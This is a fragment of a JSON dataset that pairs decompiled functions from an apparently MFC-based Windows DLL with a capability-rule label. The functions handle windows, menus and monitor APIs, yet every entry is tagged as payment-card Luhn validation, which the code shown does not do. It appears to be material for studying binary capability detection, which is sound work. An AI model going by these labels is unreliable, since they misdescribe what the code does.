        "decompiled_code": "\nulong fcn.180012e94(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.1800140a8();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x38) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.180009650(0x18001cc6c);\n        arg1_01 = fcn.180009660(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.18002c644(arg1_01, 0x18004ef88, 0x180012e5c, 0x180012804);\n        }\n        *(iVar1 + 0x38) = uVar2;\n        fcn.180009650(arg1_00);\n    }\n    return *(iVar1 + 0x38);\n}\n",
        "token_count": 225
    },
    "180012f3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.180012f38(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    iVar1 = fcn.180012e94(1);\n    if (arg1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.18002d110(iVar1 + 0x30, arg1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.18002d110(iVar1 + 0x68, arg1);\n            if (iVar2 == 0) {\n                arg1_00 = fcn.180009650(0x18001cc6c);\n                iVar2 = fcn.180030fb4(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.1800124cc();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.18002d358(iVar1 + 0x68, arg1);\n                *piVar4 = iVar2;\n                fcn.180009650(arg1_00);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 420
    },
    "180012f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.180012f5c(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t **ppiVar2;\n    \n    if (arg2 != 0) {\n        arg1[1] = arg2;\n        iVar1 = fcn.180012e94(1);\n        ppiVar2 = fcn.18002d358(iVar1 + 0x30, arg1[1]);\n        *ppiVar2 = arg1;\n        (**(*arg1 + 0x18))(arg1, arg1[1]);\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 141
    },
    "18001320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001320c(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.1800140a8();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x40) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.180009650(0x18001cc6c);\n        arg1_01 = fcn.180009660(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.18002c644(arg1_01, 0x18004f048, 0x180012e7c, 0x180012804);\n        }\n        *(iVar1 + 0x40) = uVar2;\n        fcn.180009650(arg1_00);\n    }\n    return *(iVar1 + 0x40);\n}\n",
        "token_count": 225
    },
    "1800132b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800132b0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    iVar1 = fcn.18001320c(1);\n    if (arg1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.18002d110(iVar1 + 0x30, arg1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.18002d110(iVar1 + 0x68, arg1);\n            if (iVar2 == 0) {\n                arg1_00 = fcn.180009650(0x18001cc6c);\n                iVar2 = fcn.180030fb4(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.1800124cc();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.18002d358(iVar1 + 0x68, arg1);\n                *piVar4 = iVar2;\n                fcn.180009650(arg1_00);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 421
    },
    "1800132d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.1800132d4(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    if (arg2 != 0) {\n        *(arg1 + 8) = arg2;\n        iVar1 = fcn.18001320c(1);\n        piVar2 = fcn.18002d358(iVar1 + 0x30, *(arg1 + 8));\n        *piVar2 = arg1;\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 124
    },
    "1800134f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800134f8(code **arg1)\n\n{\n    uchar auStack1128 [64];\n    ulong uStack1064;\n    uint64_t uStack24;\n    \n    uStack1064 = 0xfffffffffffffffe;\n    uStack24 = *0x180067ce0 ^ auStack1128;\n    *arg1 = vtable.CGdiObject.0;\n    fcn.180013354(arg1);\n    fcn.180032ea0(uStack24 ^ auStack1128);\n    return;\n}\n",
        "token_count": 115
    },
    "180028da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180028da8(uint32_t *arg1)\n\n{\n    if ((*arg1 != 0) && (*0x18006d2e0 != 0)) {\n        fcn.180028aa0(*0x18006d2e0, *arg1);\n    }\n    *arg1 = 0;\n    return;\n}\n",
        "token_count": 77
    },
    "18001357": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001357c(void)\n\n{\n    if (*0x180069be8 != NULL) {\n        (**0x180069be8)();\n    }\n    return;\n}\n",
        "token_count": 40
    },
    "18001359": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.180013598(ulong noname_0, int64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (arg2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (*0x180069be0 == NULL) {\n        uVar3 = 2;\n    }\n    else {\n        iVar2 = (**0x180069be0)();\n        uVar3 = iVar2 != 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 151
    },
    "1800135d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800135d0(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    \n    LOCK();\n    piVar1 = arg1 + 0x30;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        if (*(arg1 + 0x28) != NULL) {\n            (**(**(arg1 + 0x28) + 0x10))();\n            *(arg1 + 0x28) = 0;\n        }\n        if (*(arg1 + 0x10) != NULL) {\n            (**(**(arg1 + 0x10) + 0x10))();\n            *(arg1 + 0x10) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "18001364": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180013648(code **arg1)\n\n{\n    *arg1 = vtable._AFX_THREAD_STATE.0;\n    if (arg1[10] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n    }\n    if (arg1[9] != NULL) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n    }\n    if (arg1[3] != NULL) {\n        fcn.18003342c(arg1[3]);\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "18001382": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180013824(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "18001405": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180014058(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*(iVar2 + 8) == 0) {\n        iVar2 = fcn.18002878c(0x180069bf8, 0x18001400c);\n        if (iVar2 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "1800140a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800140a8(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180014058();\n    iVar2 = fcn.180028cec(iVar2 + 0xc0, 0x18000dd78);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "1800140d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800140d4(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.180014058();\n    uVar1 = 0;\n    if (((*(iVar2 + 0xd0) != 0) && (*(arg2 + 0xd8) != -1)) && (*0x180069be0 != NULL)) {\n        uVar1 = (**0x180069be0)(*(arg2 + 0xd8), arg1);\n    }\n    *(arg1 + 8) = uVar1;\n    return arg1;\n}\n",
        "token_count": 146
    },
    "18001427": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180014270(int64_t *arg1)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    code *pcVar3;\n    ushort in_DX;\n    uint32_t uVar4;\n    \n    iVar2 = *arg1;\n    uVar1 = *(iVar2 + -0x10);\n    uVar4 = uVar1 + 1;\n    if ((1U - *(iVar2 + -8) | *(iVar2 + -0xc) - uVar4) < 0) {\n        fcn.180008ed0(arg1, uVar4);\n    }\n    *(*arg1 + uVar1 * 2) = in_DX;\n    if ((-1 < uVar4) && (uVar4 <= *(*arg1 + -0xc))) {\n        *(*arg1 + -0x10) = uVar4;\n        *(*arg1 + uVar4 * 2) = 0;\n        return;\n    }\n    fcn.180001214(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 246
    },
    "18001433": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001433c(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong arg1_00;\n    int64_t arg1_01;\n    ulong uVar2;\n    \n    iVar1 = fcn.1800140a8();\n    uVar2 = 0;\n    if ((*(iVar1 + 0x30) == 0) && (arg1 != 0)) {\n        arg1_00 = fcn.180009650(0x18001cc6c);\n        arg1_01 = fcn.180009660(0xb8);\n        if (arg1_01 != 0) {\n            uVar2 = fcn.18002c644(arg1_01, 0x18004f9b0, 0x180014324, 0x180012804);\n        }\n        *(iVar1 + 0x30) = uVar2;\n        fcn.180009650(arg1_00);\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 225
    },
    "1800143e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800143e0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    int64_t *piVar4;\n    \n    iVar1 = fcn.18001433c(1);\n    if (arg1 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = fcn.18002d110(iVar1 + 0x30, arg1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.18002d110(iVar1 + 0x68, arg1);\n            if (iVar2 == 0) {\n                arg1_00 = fcn.180009650(0x18001cc6c);\n                iVar2 = fcn.180030fb4(iVar1 + 8);\n                iVar3 = iVar2;\n                if (iVar2 == 0) {\n                    iVar3 = fcn.1800124cc();\n                }\n                (**(iVar1 + 0x20))(iVar3);\n                piVar4 = fcn.18002d358(iVar1 + 0x68, arg1);\n                *piVar4 = iVar2;\n                fcn.180009650(arg1_00);\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n            else {\n                iVar3 = *(iVar1 + 0xa8);\n                *(iVar2 + iVar3) = arg1;\n                if (*(iVar1 + 0xb0) == 2) {\n                    *(iVar2 + 8 + iVar3) = arg1;\n                }\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 421
    },
    "18001443": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.180014430(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    if (arg2 != 0) {\n        *(arg1 + 8) = arg2;\n        iVar1 = fcn.18001433c(1);\n        piVar2 = fcn.18002d358(iVar1 + 0x30, *(arg1 + 8));\n        *piVar2 = arg1;\n    }\n    return arg2 != 0;\n}\n",
        "token_count": 122
    },
    "18001458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.180014580(void)\n\n{\n    int64_t iVar1;\n    char *pcVar2;\n    \n    if (*0x18006cc58 != 0) {\n        return *0x18006cc40 != 0;\n    }\n    *0x18006cc5c = fcn.180014520();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"USER32\");\n    if ((((iVar1 != 0) &&\n         (*0x18006cc20 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x18004fc18),  *0x18006cc20 != 0)) &&\n        (*0x18006cc28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromWindow\"),  *0x18006cc28 != 0)) &&\n       (((*0x18006cc30 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromRect\"),  *0x18006cc30 != 0 &&\n         (*0x18006cc38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MonitorFromPoint\"),  *0x18006cc38 != 0)) &&\n        ((*0x18006cc48 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"EnumDisplayMonitors\"),  *0x18006cc48 != 0 &&\n         (*0x18006cc50 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"EnumDisplayDevicesW\"),  *0x18006cc50 != 0))))))\n    {\n        pcVar2 = \"GetMonitorInfoW\";\n        if (*0x18006cc5c == 0) {\n            pcVar2 = \"GetMonitorInfoA\";\n        }\n        *0x18006cc40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, pcVar2);\n        if (*0x18006cc40 != 0) {\n            *0x18006cc58 = 1;\n            return true;\n        }\n    }\n    *0x18006cc20 = 0;\n    *0x18006cc28 = 0;\n    *0x18006cc30 = 0;\n    *0x18006cc38 = 0;\n    *0x18006cc40 = 0;\n    *0x18006cc48 = 0;\n    *0x18006cc50 = 0;\n    *0x18006cc58 = 1;\n    return false;\n}\n",
        "token_count": 557
    },
    "18001476": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180014764(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uchar auStack28 [20];\n    \n    iVar1 = fcn.180014580();\n    if (iVar1 == 0) {\n        if ((arg2 & 3) == 0) {\n            iVar1 = (*_sym.imp.USER32.dll_IsIconic)(arg1);\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.USER32.dll_GetWindowRect)(arg1);\n            }\n            else {\n                iVar1 = (*_sym.imp.USER32.dll_GetWindowPlacement)();\n            }\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = fcn.1800146f8(auStack28, arg2 & 0xffffffff);\n            }\n        }\n        else {\n            uVar2 = 0x12340042;\n        }\n    }\n    else {\n        uVar2 = (**0x18006cc28)(arg1, arg2 & 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 251
    },
    "1800151e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800151e8(ulong noname_0, ulong *arg2, ulong arg3)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uint *in_stack_00000028;\n    \n    uVar3 = 0;\n    if (arg3 != 0) {\n        do {\n            bVar1 = false;\n            puVar4 = 0x180066cf0;\n            puVar5 = 0x180066c50;\n            iVar6 = 0x13;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*arg2, *puVar5);\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *in_stack_00000028 = *puVar4;\n                }\n                puVar5 = puVar5 + 1;\n                puVar4 = puVar4 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n            arg2 = arg2 + 1;\n            in_stack_00000028 = in_stack_00000028 + 1;\n        } while (uVar3 < arg3);\n    }\n    return 0;\n}\n",
        "token_count": 325
    },
    "18001530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.18001530c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    uint32_t in_stack_00000028;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetWindowLongW)();\n    arg4._0_4_ = ~arg3 & uVar1 | arg4;\n    if (uVar1 == arg4) {\n        uVar2 = 0;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SetWindowLongW)(arg1, arg2, arg4);\n        if (in_stack_00000028 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowPos)(arg1, 0, 0, 0, 0, 0, in_stack_00000028 | 0x17);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 211
    },
    "18001539": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015398(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18001530c(arg1, 0xfffffff0, arg2, arg3);\n    return;\n}\n",
        "token_count": 53
    },
    "1800153b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800153b8(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.18001530c(arg1, 0xffffffec, arg2, arg3);\n    return;\n}\n",
        "token_count": 54
    },
    "1800154a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1800154ac(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.180014058();\n    if (*(iVar1 + 0x60) != NULL) {\n        (**(iVar1 + 0x60))(arg2, arg1);\n    }\n    return 0;\n}\n",
        "token_count": 78
    },
    "18001561": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180015610(code **arg1)\n\n{\n    fcn.180009a34(arg1);\n    *(arg1 + 8) = 1;\n    *arg1 = vtable.CTestCmdUI.0;\n    return arg1;\n}\n",
        "token_count": 58
    },
    "180015ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180015ad4(ulong noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    \n    uVar1 = *(arg2 + 8);\n    if (((uVar1 < 0x100) || (0x109 < uVar1)) && ((uVar1 < 0x200 || (0x209 < uVar1)))) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.18001bce4(noname_0, arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "180015f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.180015f5c(code **arg1)\n\n{\n    fcn.180009a6c(arg1);\n    *arg1 = vtable.CWnd.0;\n    arg1[0xc] = vtable.CWnd::XAccessible.0;\n    arg1[0xd] = vtable.CWnd::XAccessibleServer.0;\n    arg1[8] = NULL;\n    *(arg1 + 9) = 0;\n    arg1[0xb] = NULL;\n    arg1[10] = NULL;\n    arg1[0xe] = NULL;\n    *(arg1 + 0xf) = 0;\n    arg1[0x10] = NULL;\n    *(arg1 + 0x11) = 0;\n    arg1[0x12] = NULL;\n    arg1[0x13] = NULL;\n    arg1[0x14] = NULL;\n    return arg1;\n}\n",
        "token_count": 205
    },
    "180015fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180015fd0(int64_t hWnd, ulong lpRect, uint *arg3)\n\n{\n    uint uVar1;\n    \n    (*_sym.imp.USER32.dll_GetWindowRect)(*(hWnd + 0x40));\n    uVar1 = fcn.18001bd28(hWnd);\n    *arg3 = uVar1;\n    return;\n}\n",
        "token_count": 79
    },
    "1800161a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800161a0(ulong arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int16_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = fcn.1800140a8();\n    if ((*(iVar4 + 0x78) != 0) && (iVar1 = *(*(iVar4 + 0x78) + 0x40),  iVar1 != 0)) {\n        (*_sym.imp.USER32.dll_SendMessageW)(iVar1, 0x401, 0, 0);\n    }\n    piVar2 = *(iVar4 + 0xa0);\n    if ((arg1 != 0) && (piVar2 != NULL)) {\n        iVar3 = (*_sym.imp.USER32.dll_GetKeyState)(1);\n        if (-1 < iVar3) {\n            (**(*piVar2 + 0x2f8))(piVar2, 0xffffffffffffffff);\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "18001622": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180016220(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t in_stack_00000028;\n    ulong in_stack_00000030;\n    \n    iVar3 = fcn.180013824();\n    uVar1 = *(iVar3 + 200);\n    uVar2 = *(iVar3 + 0xd0);\n    if (in_stack_00000028 != 0) {\n        in_stack_00000028 = *(in_stack_00000028 + 0x40);\n    }\n    *(iVar3 + 200) = in_stack_00000028;\n    *(iVar3 + 0xd0) = *(arg1 + 8);\n    (*_sym.imp.USER32.dll_TrackPopupMenu)(*(arg1 + 8), arg2, arg3, arg4, 0, in_stack_00000028, in_stack_00000030);\n    *(iVar3 + 200) = uVar1;\n    *(iVar3 + 0xd0) = uVar2;\n    return;\n}\n",
        "token_count": 252
    },
    "1800162d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1800162dc(int64_t hMenu, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ulong arg1;\n    int32_t iVar5;\n    \n    arg2 = arg2 & 0xffffffff;\n    if (hMenu == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        iVar4 = (*pcVar1)();\n        return iVar4;\n    }\n    iVar2 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(hMenu + 8));\n    iVar5 = 0;\n    if (0 < iVar2) {\n        do {\n            arg1 = (*_sym.imp.USER32.dll_GetSubMenu)(*(hMenu + 8));\n            iVar4 = fcn.1800143e0(arg1);\n            if (iVar4 == 0) {\n                iVar3 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(hMenu + 8));\n                if (iVar3 == arg2) goto code_r0x00018001636f;\n            }\n            else {\n                if (*(iVar4 + 8) == arg2) {\ncode_r0x00018001636f:\n                    iVar4 = fcn.180014404(*(hMenu + 8));\n                    return iVar4;\n                }\n                iVar4 = fcn.1800162dc(iVar4, arg2);\n                if (iVar4 != 0) {\n                    return iVar4;\n                }\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 367
    },
    "18001637": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18001637c(code **arg1)\n\n{\n    *arg1 = vtable._AFX_HTMLHELP_STATE.0;\n    if (arg1[1] != NULL) {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "18001728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.180017288(int64_t *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong in_R9;\n    ulong uVar3;\n    uint auStack40 [2];\n    int64_t *piStack32;\n    uint uStack24;\n    \n    uVar3 = 0xfffffffffffffffe;\n    uStack24 = 0;\n    auStack40[0] = arg2;\n    piStack32 = arg1;\n    iVar2 = fcn.180013824();\n    uVar1 = *(iVar2 + 0x198);\n    *(iVar2 + 0x198) = arg1[8];\n    (**(*arg1 + 0x1f8))(arg1, auStack40, *arg1, in_R9, uVar3);\n    *(iVar2 + 0x198) = uVar1;\n    return 1;\n}\n",
        "token_count": 201
    },
    "180017ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180017ab4(uint32_t *arg1)\n\n{\n    if (*arg1 != 0x7fffffff) {\n        int.18001cb10(*arg1);\n        *arg1 = 0x7fffffff;\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "180017b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
